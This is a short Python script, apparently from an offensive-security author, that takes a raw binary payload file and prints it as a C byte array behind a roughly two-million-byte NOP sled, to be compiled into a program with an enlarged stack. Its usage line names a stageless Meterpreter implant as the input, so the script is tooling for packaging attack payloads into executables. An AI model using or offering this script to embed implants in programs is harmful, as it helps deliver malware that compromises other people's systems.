import sys
# by 0xTriboulet
# Short python script that takes a raw binary payload
# and build a (big) nop sled over that payload
# put this large payload into your program and compile with:
# /STACK:3000000
# PYTHON3
try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    print("python3 pushingpayloadsv3.py meterpreter_stageless.bin > out.txt")
    sys.exit()

print('unsigned char payload[] = { '+'0x90, '*2048000 + '0x' + ', '.join(str(hex(x)) for x in plaintext) + ' };')